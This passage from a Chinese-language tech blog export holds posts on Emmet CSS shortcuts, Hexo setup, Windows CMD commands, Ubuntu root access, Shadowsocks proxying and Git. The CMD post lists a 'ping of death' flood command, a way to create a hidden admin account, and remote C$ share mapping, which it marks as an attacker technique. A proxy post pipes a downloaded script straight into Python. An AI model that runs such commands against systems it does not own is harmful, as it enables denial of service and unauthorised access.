crosshair;cur:ha =&gt; cursor: hand;cur:he =&gt; cursor: help;cur:m =&gt; cursor: move;cur:p =&gt; cursor: pointer;cur:t =&gt; cursor: text;外边距和内边距margin &amp;&amp; paddingm =&gt; margin: ;m:a =&gt; margin: auto;mt =&gt; margin-top: ;mt:a =&gt; margin-top: auto;mr =&gt; margin-right: ;mr:a =&gt; margin-right: auto;mb =&gt; margin-bottom: ;mb:a =&gt; margin-bottom: auto;ml =&gt; margin-left: ;ml-a =&gt; margin-left: auto;p =&gt; padding: ;pt =&gt; padding-top: ;pr =&gt; padding-right: ;pb =&gt; paddng-bottom: ;pl =&gt; padding-left: ;盒子模型boxbxz =&gt; box-sizing: border-box;bxz:cb =&gt; box-sizing: content-box;bxz:bb =&gt; box-sizing: border-box;bxsh =&gt; box-shadow: inset hoff voff blur color;bxsh:r =&gt; box-shadow: inset hoff voff blur spread rgb(0, 0, 0);bxsh:ra =&gt; box-shadow: inset h v blur spread rgba(0, 0, 0, .5);bxsh:n =&gt; box-shadow: none;width &amp;&amp; hightw =&gt; width: ;w:a =&gt; width: auto;h =&gt; hight: ;h:a =&gt; hight: auto;maw =&gt; max-width: ;maw:n =&gt; max-width: none;mah =&gt; max-hight: ;mah:n =&gt; max-hight: none;miw =&gt; min-width: ;mih =&gt; min-hight: ;字体和文本fontf =&gt; font: ;f+ =&gt; font: 1em Arial,sans-serif;fw =&gt; font-weight: ;fw:n =&gt; font-weight: none;fw:b =&gt; font-weight: bold;fw:br =&gt; font-weight: bolder;fw:lr =&gt; font-weight: lighter;fs =&gt; font-style: italic;fs:n =&gt; font-style: normal;fs:i =&gt; font-style: italic;fs:o =&gt; font-style: oblique;fv =&gt; font-variant: ;fv:n =&gt; font-variant: normal;fv:sc =&gt; font-variant: small-caps;fz =&gt; font-size: ;fza =&gt; font-size-adjust: ;fza:n =&gt; font-size-adjust: none;ff =&gt; font-family: ;ff:s =&gt; font-family: serif;ff:ss =&gt; font-family: sans-serif;ff:c =&gt; font-family: cursive;ff:f =&gt; font-family: fantasy;ff:m =&gt; font-family: monospace;ff:a =&gt; font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif;fef =&gt; font-effect: ;fef:n =&gt; font-effect: none;fef:eg =&gt; font-effect: engrave;fef:eb =&gt; font-effect: emboss;fef:o =&gt; font-effect: outline;@i =&gt; @import url();@f =&gt;@font-face { font-family: ; src: url(); } @f+ =&gt;@font-face { font-family: &quot;FontName&quot;; src: url(&quot;FileName.eot&quot;); src: url(&quot;FileName.eot?#iefix&quot;) format(&quot;embedded-opentype&quot;), url(&quot;FileName.woff&quot;) format(&quot;woff&quot;), url(&quot;FileName.ttf&quot;) format(&quot;truetype&quot;), url(&quot;FileName.svg#FontName&quot;) format(&quot;svg&quot;); font-style: normal; font-weight: normal; } verticalva =&gt; vertical-align: top;va:sup =&gt; vertical-align: super;va:t =&gt; vertical-align: top;va:tt =&gt; vertical-align: text-top;va:m =&gt; vertical-align: middle;va:bl =&gt; vertical-align: baseline;va:b =&gt; vertical-align: bottom;va:tb =&gt; vertical-align: text-bottom;va:sub =&gt; vertical-align: sub;textta =&gt; text-align: left;ta:l =&gt; text-align: left;ta:c =&gt; text-align: center;ta:r =&gt; text-align: right;ta:j =&gt; text-align: justify;ta-lst =&gt; text-align-last: ;tal:a =&gt; text-align-last: auto;tal:l =&gt; text-align-last: left;tal:c =&gt; text-align-last: center;tal:r =&gt; text-align-last: right;tov =&gt; text-overflow: ellipsis;tov:c =&gt; text-overflow: clip;tov:e =&gt; text-overflow: ellipsis;td =&gt; text-decoration: none;td:n =&gt; text-decoration: none;td:u =&gt; text-decoration: underline;td:o =&gt; text-decoration: overline;td:l =&gt; text-decoration: line;CSS 3 动画keyframes@kf =&gt;@-webkit-keyframes identifier { from { } to { } } @-o-keyframes identifier { from { } to { } } @-moz-keyframes identifier { from { } to { } } @keyframes identifier { from { } to { } } animationanim- =&gt; animation: name duration timing-function delay iteration-count direction fill-mode;animdel =&gt; animation-delay: time;animdir =&gt; animation-direction: normal;animdir:a =&gt; animation-direction: alternate;animdir:ar =&gt; animation-direction: alternate;animdir:n =&gt; animation-direction: normal;animdir:r =&gt; animation-direction: reverse;transformtrf =&gt; transform: ;trf:r =&gt; transform: rotate(angle);trf:sc =&gt; transform: scale(x, y);trf:scx =&gt; transform: scale(x);trf:scy =&gt; transform: scale(y);trf:skx =&gt; transform: skewX(angle);trf:sky =&gt; transform: skewY(angle);trf:t =&gt; transform: translate(x, y);trf:tx =&gt; transform: translateX(x);trf:ty =&gt; transform: translateY(y);trfo =&gt; transform-origin: ;trfs =&gt; transform-style: preserve-3d;transitiontrs =&gt; transition: prop time;trsde =&gt; transition-delay: time;trsdu =&gt; transition-duration: time;trsp =&gt; transition-property: prop;trstf =&gt; transition-timing-function: tfunc;更多用法实例在线查看查看 emmet-usage-examples.jpg请下载查看 emmet-usage-examples.jpg]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 Hexo+NexT 在 Github 上搭建静态博客]]></title>
    <url>%2Farchives%2Fef056a27.html</url>
    <content type="text"><![CDATA[Hexo 是一个快速,简单而高效的静态博客框架,本文将介绍如何在 GitHub 上使用 Hexo+NexT 搭建静态博客准备你需要在 Github 上创建一个属于自己的账户,然后新建一个仓库（new repository）,并命名为 YourSiteName.github.io,此时 Github 会帮助你初始化一个静态网页,你可以根据自己的喜好选择一些模版（这都不是重点）,接着尝试访问下你所建的站点,成功后就可以开始动工了。Node.js 环境需安装 nvm,任何版本皆可nvm 5 nvm alias defaults 5 安装 Git如果你的系统没有 git,则必装sudo apt-get install git Hexo 初始化博客框架参考链接Hexo 官网Hexo 配置文档Hexo 相关指令Hexo 主题安装 Hexonpm install -g hexo-cli 初始化框架hexo init [yourFolder] cd [folderName] npm install 新建文章hexo new &quot;Hello World&quot; 在 ./source/_post 里添加 hello-world.md 文件,之后新建的文章都将存放在此目录下。新建页面hexo new page tags hexo new page categories 在 ./source/ 里添加 tags 和 categories 目录,即标签页和分类页取消标签页和分类页的评论功能标签页 ./source/categories/index.md--- title: null date: type: &quot;categories&quot; comments: false --- 分类页 ./source/tags/index.md--- title: null date: type: &quot;tags&quot; comments: false --- 建议修改默认的文章模板vim ./scaffolds/post.md 修改成--- title: {{ title }} date: {{ date }} categories: tags: --- 生成静态网站hexo generate 此时会将 /source 的 .md 文件生成 html 文件到 /public 中,形成网站的静态文件。本地预览hexo server -p 3000 输入 //localhost:3000 即可查看网站,若无指定端口号,将采用默认端口 4000。 使用 Ctrl + C 快捷键终止该进程部署网站至 githubhexo deploy 静态化且部署简化命令hexo g -d 部署网站前请配置./_config.ymldeploy: type: git repo: git@github.com:youName/youName.github.io.git branch: master 部署前请执行npm install hexo-deployer-git --save hexo clean hexo generate 使用 NexT 主题让站点更酷炫参考链接NexT 参考文档NexT 主题配置NexT 第三方服务更多的配置问题下载主题cd &lt;yourFolder&gt; git clone https://github.com/iissnan/hexo-theme-next themes/next 修改配置文件vim ./_config.yml 修改theme: next 验证主题效果hexo s --debug 访问 //localhost:4000,确保站点正确运行站内搜索安装 hexo-generator-searchnpm install hexo-generator-search --save 编辑配置文件./_config.yml在任意位置添加以下内容search: path: search.xml field: post format: html limit: 10000 编辑主题配置文件./themes/next/_config.yml# Local search local_search: enable: true 开启字数统计和阅读时长安装 hexo-wordcountnpm install hexo-wordcount --save 编辑主题配置文件./themes/next/_config.ymlpost_wordcount: item_text: true wordcount: true min2read: true 我的配置（只写出部分配置）站点配置文件./_config.yml# Site language: zh-Hans # search search: path: search.xml field: post # URL url: ./ # Writing highlight: enable: true line_number: true auto_detect: true tab_replace: # Pagination per_page: 5 pagination_dir: page # Extensions theme: next # Deployment deploy: type: git repo: git@github.com:vxhly/vxhly.github.io.git branch: master 主题配置文件文件./themes/next/_config.yml# Specify the date when the site was setup since: 2016 # Footer `powered-by` and `theme-info` copyright copyright: true menu: home: / categories: /categories #about: /about archives: /archives tags: /tags #sitemap: /sitemap.xml commonweal: /404.html # Schemes #scheme: Muse scheme: Mist #scheme: Pisces # Social Links social: #LinkLabel: Link GitHub: //github.com/vxhly Weibo: //weibo.com/5039312152 # Automatically scroll page to section which is under &lt;!-- more --&gt; mark. scroll_to_more: true # Automatically Excerpt. Not recommand. auto_excerpt: enable: true length: 150 # Code Highlight theme highlight_theme: night eighties # Duoshuo ShortName duoshuo_shortname: vxhly enable: true length: 150 # Post wordcount display settings post_wordcount: item_text: true wordcount: true min2read: true # Share duoshuo_share: true # Make duoshuo show UA duoshuo_info: ua_enable: true admin_enable: true user_id: 13846473 admin_nickname: Author 腾讯公益 404 页面./themes/next/source/404.html&lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8;&quot;/&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt; &lt;meta name=&quot;robots&quot; content=&quot;all&quot; /&gt; &lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;//www.qq.com/404/search_children.js&quot; charset=&quot;utf-8&quot; homePageUrl=&quot;/&quot; homePageName=&quot;回到我的主页&quot;&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CMD 常用命令]]></title>
    <url>%2Farchives%2F2283a2c8.html</url>
    <content type="text"><![CDATA[记录 windows 下常用的 CMD 命令改变 CMD 显示颜色color 0 支持的颜色0 = 黑色1 = 蓝色2 = 绿色3 = 浅绿色4 = 红色5 = 紫色6 = 黄色7 = 白色8 = 灰色9 = 淡蓝色A = 淡绿色B = 淡浅绿色C = 淡红色D = 淡紫色E = 淡黄色F = 亮白色用户和用户组相关的命令添加或删除用户For Example:# 添加一个永不过期的用户, 并且设置登录口令 net user [userName] [password] /add /expires:never # 删除用户 net user [userName] /delete 将用户添加到管理员组或从管理员组删除 # 将用户添加到管理员组 net localgroup Administrators [userName] /add # 将用户从管理员组删除 net localgroup Administrators [userName] /delete # 修改当前用户的密码 net user [userName] [password] 激活或禁用用户For Example:net user [userName] /active:yes # 激活用户 net user [userName] /active:no # 禁用用户 新建或删除用户组For Example:net localgroup [groupName] /add # 新建用户组 net localgroup [groupName] /delete # 删除用户组 文件和目录相关命令列出目录结构For Example:dir [path]:/[folderName] dir /a:h /s # 显示当前目录及其子目录下的隐藏文件 dir /a:s /s # 显示当前目录及其子目录下的系统文件 dir /a:r /s # 显示当前目录及其子目录下的只读文件 dir /a:a /s # 显示当前目录及其子目录下的存档文件 创建文件并向文件输出信息For Example:echo &quot;test text&quot; &gt; 1.txt # 覆盖 echo &quot;tesr text&quot; &gt;&gt; 1.txt # 追加 conpy con [path]:/[fileName] # ctrl+Z 回车结束输入 创建目录For Example:md [folderName] 切换目录、 盘符For Example:cd [path]:/[folderName] cd / # 切换到根目录 d: # 切换到 D 盘 删除文件或目录For Example:del [fileName] # 删除文件 rd [folderName] # 删除空目录（目录中不能有子目录和文件） rd [folderName] /S /Q # 删除目录并同时删除目录中的子目录以及文件 移动或复制文件For Example:move [path]:/[fileName] [path]:/[fileName] # 移动文件（也可重命名） copy [path]:/[fileName] [path]:/[fileName] # 复制单文件 # 复制目录及其子目录（包含空目录） xcopy [path]:/[folderName] [path]:/[folderName] /E # 复制目录及其子目录（不包含空目录） xcopy path:/[folderName] [path]:/[folderName] /S # 复制隐藏文件和系统文件 xcopy [path]:/[fileName] [path]:/[fileName] /H 查看文件的内容For Example:type [fileName] # 在 DOS 下查看 start [fileName] # 调用默认程序查看 设置文件或目录属性For Example:attrib +S +H [path]:/[fileName] # 添加系统文件和隐藏文件属性 # 处理文件夹及子文件里匹配的文件（包含该文件夹） attrib +S +H [path]:/[fileName] /S /D 重命名For Example:ren [fileName1] [fileName2] 显示目录树For Example:tree [path]:/[folderName] /F 网络、 服务相关pingFor Example:ping -t -l 65500 [IP or domain] # 死亡之 ping ping [ip] # 测试网络的连通性 ipconfigFor Example:ipconfig -all # 查看当前所有的 ip 地址信息 ipconfig /release # 清除当前获取到的 ip 地址 ipconfig /renew # 重新获取 ip 地址 natstatFor Example:netstat -ano # 列出所有端口的使用情况 netstat -o # 显示连接进程的情况, 通常用于查找是否有木马程序 arpFor Example:arp -a # 显示 ARP 列表 arp -d # 清除 ARP 列表, 需要管理员权限 arp -s [ip] [macAddress] # 添加静态项 netFor Example:net view # 查看当前局域网内的其他连接者 net start # 查看开启了哪些服务 net start [serviceName] # 开启某一个服务 net stop [serviceName] # 停止某一个服务 # 将某一个服务器的 C 盘映射成 K 盘, 攻击者常用命令 net use k: \/[ipAddress]\c$ # 以下命令建议需管理员权限 net share # 查看本地开启的共享 net share ipc$ # 开启 ipc$ 共享 net share ipc$ /del # 删除 ipc$ 共享 net share c$ /del # 删除 C 盘的共享 tracertFor Example:tracert [IP or domain] # 跟踪路由 mstscFor Example:mstsc /v: [ip] /console # 远程连接 关机和重启For Example:shutdown -s -t 180 -c &quot;确定关机吗？ &quot; 选项解释-s 关机-r 重启-t 指定时间-c 对话框确认信息-a 取消上一个任务获取命令的帮助信息For Example:net help [command] help [command] [command] /? 系统文件修复（需管理员权限）查看当前的系统信息For Example:systeminfo 扫描系统文件错误并复原For Example:sfc /scannow]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu 开启 root 用户]]></title>
    <url>%2Farchives%2Fe6877bfb.html</url>
    <content type="text"><![CDATA[Ubuntu 默认不开启 root 账户的,所以有需开启 root 账户的按照以下做法即可,切换 root 账户后 chromium 浏览器不能使用打开终端开启 root 账户sudo passwd -u root 为 root 账户设置密码输入两次sudo passwd root 测试 root 账户输入 root 密码,进入 root 终端su - 设置登录面板,使其实现 root 登录使用 vimsudo vim /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf 使用 geditsudo gedit /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf 添加如下代码,保存退出user-session=ubuntu greeter-show-manual-login=true all-guest=false 重启 ubuntu,需切换 root 账户su - reboot 删除原先账户如果你不喜欢原先的账户,大可以彻底删除用户在 root 用户下userdel -r userName 在普通用户下sudo userdel -r userName 注意：因为需要彻底删除用户,所以加上-r 的选项,在删除用户的同时一起把这个用户的宿主目录和邮件目录删除；userName 需替换成你的原先账户名]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 生成随机数]]></title>
    <url>%2Farchives%2F5c7d9cd0.html</url>
    <content type="text"><![CDATA[为 JS 中的 Math 对象新增生成不重复随机数方法方法源码一/** * Math 对象的扩展方法,可用于生成随机数 * @param {number} startNum 起始数,整型 * @param {number} endNum 终止数,整型 * @param {number} count 生成的个数,整型 * @param {boolean} repeat 是否重复,true or false * @return {Array} 返回数组 */ Math.randNum = function(startNum, endNum, count, repeat) { if (repeat) { var ret = new Array(); for (var i = 0;i &lt; count;i++) { // 生成区间范围内的随机数 ret[i] = Math.floor(Math.random() * (endNum - startNum) + startNum); } return ret; } else { var tmp = new Array(); for (var i = 0;;i++) { if (tmp.length &lt; count) { // 生成区间范围内的随机数 var rand = Math.floor(Math.random() * (endNum - startNum) + startNum); for (var i = 0;i &lt; tmp.length;i++) { if (tmp[i] == rand) { // 将生成的随机数进行比对,如果相同则重新生成 return Math.randNum(startNum, endNum, count, repeat); } } // 向数组添加数据 tmp.push(rand); } else { break; } } return tmp; } }; 如何调用Math.randNum(number, number, number, true | false); demo1控制台代码console.log(Math.randNum(3,16,5,true);) 输出 =&gt; [4, 15, 15, 15, 17]demo2控制台代码console.log(Math.randNum(3,16,5,false);) 输出 =&gt; [15, 14, 6, 11, 4]方法源码二一种更简单的写法var arr = new Array();//新建一个数组 // 向数组赋值 0~100 for (var i = 0;i &lt;= 100;i++) { arr.push(i); } // 随机排位 arr.sort(function() { return 0.5 - Math.random(); }); arr.length = 50;// 指定数组长度 document.write(arr);// 输出数组]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu 下连接 WIFI]]></title>
    <url>%2Farchives%2F9b236238.html</url>
    <content type="text"><![CDATA[基于已经安装双系统,或是只有 Ubuntu 系统,在虚拟机下不存在此问题查看无线网卡信息lspci | grep -i network 下载无线网卡驱动本人的无线网卡为 Realtek-RTL8723BE下载地址 rtl8723be.tar.gz驱动安装(解压进入目录)make sudo make install sudo modprobe rtl8723be (rtl8723be 需替换成自己的网卡) 设置为开机启动项sudo modprobe -r rtl8723be (rtl8723be 需替换成自己的网卡) sudo modprobe rtl8723be (rtl8723be 需替换成自己的网卡) 重启网卡ifconfig wlan0 down ifconfig wlan0 up 重启网络服务service network restart]]></content>
      <categories>
        <category>networking</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu 下科学上网]]></title>
    <url>%2Farchives%2F79ca2b96.html</url>
    <content type="text"><![CDATA[翻墙,主要用于 npm 的代理。没有 vpn 服务器不要紧,肯花点小钱就可以搞定（访问 高梯子）方法一下载 shadowsocks-libev下载 shadowsocks-libev 安装包,解压并重命名为 shadowsocks-libevSource code (zip) 下载地址Source code (tar.gz) 下载地址安装 shadowsocks-libevcd shadowsocks-libev sudo apt-get install build-essential autoconf libtool libssl-dev \ gawk debhelper dh-systemd init-system-helpers pkg-config dpkg-buildpackage -us -uc -i cd .. sudo dpkg -i shadowsocks-libev*.deb 建议安装前先更新一下软件列表如果显示 “现在没有可用的软件包” 等字样,建议先执行sudo rm /var/lib/apt/lists/* -vf sudo apt-get update sudo apt-get upgrade 配置 config.json 文件使用 vimsudo vim /etc/shadowsocks-libev/config.json 或者使用 geditsudo gedit /etc/shadowsocks-libev/config.json 修改服务器地址跟密码{ &quot;server&quot;: &quot;&quot;, &quot;server_port&quot;: 8388, &quot;local_port&quot;: 1080, &quot;password&quot;: &quot;&quot;, &quot;timeout&quot;: 60, &quot;method&quot;: &quot;rc4-md5&quot; } 配置 shadowsocks-libev 文件使用 vimsudo vim /etc/init.d/shadowsocks-libev 或者使用 geditsudo gedit /etc/init.d/shadowsocks-libev 修改文件DAEMON=/usr/bin/ss-server =&gt;DAEMON=/usr/bin/ss-local 启动 shadowsocks-libevsudo service shadowsocks-libev restart 安装 Privoxysudo apt-get install privoxy 配置 Privoxy使用 vimsudo vim /etc/privoxy/config 或者使用 geditsudo gedit /etc/privoxy/config 按 shift+g 切到最后一行,添加forward-socks5 / 127.0.0.1:1080 . 配置终端 http 代理export http_proxy=&quot;127.0.0.1:8118&quot; export https_proxy=&quot;127.0.0.1:8118&quot; 配置终端 http 代理的启动使用 vimsudo vim ~/.bashrc 或者使用 geditsudo gedit ~/.bashrc 按 shift+g 切到最后一行,添加export http_proxy=&quot;127.0.0.1:8118&quot; export https_proxy=&quot;127.0.0.1:8118&quot; 如果此举会影响到终端下载,建议还是不要设置为好。启动 Privoxysudo service privoxy restart 测试代理是否成功（需安装 curl）curl https:https://www.google.com.hk 返回带 google 字样表示受理成功配置 npm 代理（需安装 node、npm）npm config set proxy http://127.0.0.1:8118 npm config set https-proxy http://127.0.0.1:8118 清除 npm 代理npm config delete proxy npm config delete https-proxy 方法二安装 shadowsockssudo apt-get install python-gevent python-pip python-setuptools m2crypto sudo pip install shadowsocks 建议安装前先更新一下软件列表sudo apt-get update sudo apt-get upgrade 新建 shadowsocks.json 文件使用 vimsudo vim /etc/shadowsocks.json 或使用 geditsudo gedit /etc/shadowsocks.json 添加内容{ &quot;server&quot;: &quot;&quot;, &quot;server_port&quot;: 8388, &quot;local_port&quot;: 1080, &quot;password&quot;: &quot;&quot;, &quot;timeout&quot;: 60, &quot;method&quot;: &quot;rc4-md5&quot; } 启动 shadowsockssslocal -c /etc/shadowsocks.json 设置为启动时自动运行。在 /etc/rc.local 中添加如下命令,注意在 exit 0 之前。sudo sslocal -c /etc/shadowsocks.json 安装 Privoxysudo apt-get install privoxy 配置 Privoxy使用 vimsudo vim /etc/privoxy/config 或者使用 geditsudo gedit /etc/privoxy/config 修改监听地址listen-address 127.0.0.1:8118 按 shift+g 切到最后一行,添加forward-socks5 / 127.0.0.1:1080 . 启动 Privoxysudo /etc/init.d/privoxy restart 配置终端 http 代理export http_proxy=&quot;127.0.0.1:8118&quot; export https_proxy=&quot;127.0.0.1:8118&quot; 为了方便还是在 /etc/rc.local 中添加如下命令,注意在 exit 0 之前。sudo /etc/init.d/privoxy start 配置终端 http 代理的启动使用 vimsudo vim ~/.bashrc 或者使用 geditsudo gedit ~/.bashrc 按 shift+g 切到最后一行,添加export http_proxy=&quot;127.0.0.1:8118&quot; export https_proxy=&quot;127.0.0.1:8118&quot; 如果此举会影响到终端下载,建议还是不要设置为好。测试代理是否成功（需安装 curl）curl https://www.google.com.hk 返回带 google 字样表示受理成功配置 npm 代理（需安装 node、npm）npm config set proxy http://127.0.0.1:8118 npm config set https-proxy http://127.0.0.1:8118 清除 npm 代理npm config delete proxy npm config delete https-proxy 附上 Shadowsocks 服务器搭建方法首先你要有一台专属于你的服务器,hostker 这里提供较为便宜的服务器更新软件源安装前最好先更新一下软件源sudo apt-get update sudo apt-get upgrade 安装 Shadowsocks 服务端使用 pip 方式安装apt-get install python-pip pip install shadowsocks pip 安装时候可能会报错,执行以下命令再重新安装一次wget //bootstrap.pypa.io/ez_setup.py -O - | python 当然你也可以更新一下 pippip install --upgrade pip 启动 Shadowsocks 服务端ssserver -p 8388 -k password -m rc4-md5 --user nobody -d start 其中 8388 是远程服务器端口,password 是连接密码,rc4-md5 是加密方式Shadowsocks Windows 端shadowsocks-windows使用 shadowsocks-libev 一键安装脚本默认配置：服务器端口：8989客户端端口：1080密码：自己设定（如不设定,默认为 teddysun.com）下载安装CentOS 系统wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev.sh chmod +x shadowsocks-libev.sh ./shadowsocks-libev.sh 2&gt;&amp;1 | tee shadowsocks-libev.log Ubuntu,Debian 系统wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh chmod +x shadowsocks-libev-debian.sh ./shadowsocks-libev-debian.sh 2&gt;&amp;1 | tee shadowsocks-libev-debian.lo 安装完成安装完成后,脚本提示如下：Congratulations, shadowsocks-libev install completed! Your Server IP:your_server_ip Your Server Port:8989 Your Password:your_password Your Local IP:127.0.0.1 Your Local Port:1080 Your Encryption Method:aes-256-cfb Welcome to visit://teddysun.com/357.html Enjoy it! 卸载方法：使用 root 用户登录,运行以下命令：./shadowsocks-libev.sh uninstall 查看进程是否存在安装完成后即已后台启动 shadowsocks ,运行：ps -ef | grep ss-server | grep -v ps | grep -v grep 其他命令启动：/etc/init.d/shadowsocks start停止：/etc/init.d/shadowsocks stop重启：/etc/init.d/shadowsocks restart查看状态：/etc/init.d/shadowsocks status]]></content>
      <categories>
        <category>networking</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git 远程推送配置]]></title>
    <url>%2Farchives%2F9a1dd005.html</url>
    <content type="text"><![CDATA[Git 是一个开源的分布式版本控制系统,可以有效、高速的处理从很小到非常大的项目版本管理安装 Git如果你的系统还没有 Git,请通过以下命令安装sudo apt-get install git 创建帐号创建你的 GitHub 帐号,或者 Git@OSC 帐号GitHub 链接Git@OSC 链接liunx 创建 SSH 密钥ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot; 添加 public key查看你的 public key,并把它添加到您的账户中如 GitHub key 如 Git@OSC key使用以下命令查看cat /home/youname/.ssh/id_rsa.pub 测试验证是否成功ssh -T git@github.com 或ssh -T git@git.oschina.net 返回你在 GitHub 或 Git@OSC 上注册的用户名代表成功。GitHub 或 Git@OSC 上创建项目GitHub 链接Git@OSC 链接本地配置请尽量保持你的名字和你的邮箱和 GitHub 或 Git@OSC 的注册一致。git config --global user.name &quot;your name&quot; git config --global user.email &quot;your email&quot; 本地多个 ssh-key 的配置在 .ssh 目录下面创建名为 config 的配置文件,配置文件内容如下Host me.github.com # 相当于 DNS 的作用 HostName github.com # 解析的地址 PreferredAuthentications publickey IdentityFile ~/.ssh/me_rsa # 这是您生成密钥的文件名,注意是私钥的文件名 Host work.github.com # 相当于 DNS 的作用 HostName github.com # 解析的地址 PreferredAuthentications publickey IdentityFile ~/.ssh/work_rsa # 这是您生成密钥的文件名,注意是私钥的文件名 测试连接ssh -T git@me.github.com # =&gt; 将会自动解析成 git@github.com ssh -T git@work.github.com # =&gt; 将会自动解析成 git@github.com 进入项目目录,初始化git init 添加项目至本地仓库git add . 提交并备注git commit -m &quot;first commit&quot; git remote add origin git@github.com:[youName]/[appName].git git push -u origin master 解决冲突git pull origin master 强制覆盖本地代码（更新本地源）git fetch --all 创建一个新的标签并提交git tag -a v1.0.0 -m &quot;test@1.0.0&quot; git push origin --tags 查看本地标签git tag 删除远程 taggit push origin --delete tag [tagname] git tag -d [tagname] # 删除本地 tag git push origin :refs/tags/[tagname] 获取远程 taggit fetch origin tag [tagname] 修改 remotegit remote set-url origin git@[URL]:[userName]/[projectName] # or git remote rm origin git remote add origin git@[URL]:[userName]/[projectName].git git 分支管理查看远程分支git branch -a 查看本地分支git branch 创建本地分支git branch [branchName] 删除远程分支git push origin --delete [branchName] # or git push origin :[branchName] 本地分支推送到远程分支git push origin [branchName] 切换分支git checkout [branchName] 合并分支git checkout master git merge [branchName] git push origin master 如果分支合并时出现了冲突,那么只能强上了git branch -m master old-master git branch -m [branchName] master git push -f origin master submodule当项目越来越庞大之后,不可避免的要拆分成多个子模块,我们希望各个子模块有独立的版本管理,并且由专门的人去维护,这时候我们就要用到 git 的 submodule 功能。git clone &lt;repository&gt; --recursive 递归的方式克隆整个项目 git submodule add &lt;repository&gt; &lt;path&gt; 添加子模块 git submodule init 初始化子模块 git submodule update 更新子模块 git submodule foreach git pull 拉取所有子模块 删除子模块# 逆初始化模块，其中{MOD_NAME}为模块目录，执行后可发现模块目录被清空 git submodule deinit {MOD_NAME} # 删除.gitmodules中记录的模块信息（--cached选项清除.git/modules中的缓存） git rm --cached {MOD_NAME} # 提交更改到代码库，可观察到&#39;.gitmodules&#39;内容发生变更 git commit -am &quot;Remove a submodule.&quot; 修改模块的 URL修改’.gitmodules’文件中对应模块的”url“属性;使用 git submodule sync 命令，将新的URL更新到文件 .git/configgit 中配置 autocrlf换行符源文件中是换行符是 LF如果你的源文件中是换行符是 LF,而 autocrlf=true, 此时 Git add . 就会遇到 fatal: LF would be replaced by CRLF 的错误。有两个解决办法：将你的源文件中的 LF 转为 CRLF 即可【推荐】将 autocrlf 设置为 false源文件中是换行符是 CRLF如果你的源文件中是换行符是 CRLF,而 autocrlf=input, 此时 Git add . 也会遇到 fatal: CRLF would be replaced by LF 的错误。有两个解决办法：将你源文件中的 CRLF 转为 LF【推荐】将 autocrlf 设置为 true 或者 falsecore.autocrlfGit 可以在你提交时自动地把行结束符 CRLF 转换成 LF,而在签出代码时把 LF 转换成 CRLF。用 core.autocrlf 来打开此项功能,如果是在 Windows 系统上,把它设置成 true,这样当签出代码时,LF 会被转换成 CRLF：git config --global core.autocrlf true Linux 或 Mac 系统使用 LF 作为行结束符,因此你不想 Git 在签出文件时进行自动的转换；当一个以 CRLF 为行结束符的文件不小心被引入时你肯定想进行修正,把 core.autocrlf 设置成 input 来告诉 Git 在提交时把 CRLF 转换成 LF,签出时不转换：git config --global core.autocrlf input 这样会在 Windows 系统上的签出文件中保留 CRLF,会在 Mac 和 Linux 系统上,包括仓库中保留 LF。如果你是 Windows 程序员,且正在开发仅运行在 Windows 上的项目,可以设置 false 取消此功能,把回车符记录在库中：git config --global core.autocrlf false 建议在 Mac/Liunx 上设置 autocrlf = input,在 Windows 上设置 autocrlf = true（默认值）。Windows：（true） 提交时,将 CRLF 转成 LF 再提交；切出时,自动将 LF 转为 CRLF;MAC/Linux: (input) 提交时,将 CRLF 转成 LF 再提交；切出时,保持 LF 即可这样即可保证仓库中永远都是 LF. 而且在 Windows 工作空间都是 CRLF,在 Mac/linux 工作空间都是 LF]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 nvm 安装 Node.js]]></title>
    <url>%2Farchives%2Fc6e979c.html</url>
